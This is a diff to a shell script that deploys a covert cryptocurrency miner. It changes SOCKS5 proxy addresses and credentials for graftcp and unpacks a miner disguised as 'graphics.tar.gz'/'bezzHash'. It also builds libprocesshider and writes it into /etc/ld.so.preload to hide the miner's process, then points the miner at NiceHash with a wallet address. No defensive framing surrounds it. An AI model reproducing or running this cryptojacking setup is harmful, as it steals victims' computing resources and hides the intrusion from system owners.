@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 52.15.235.202:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = 18.223.155.101:1080
+socks5_username = sempakcok
+socks5_password = gunturmanis
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -23,14 +23,14 @@ sleep .2
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo "**"
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo "**"
 
 echo " "
 echo " "
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --url=ssl://3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
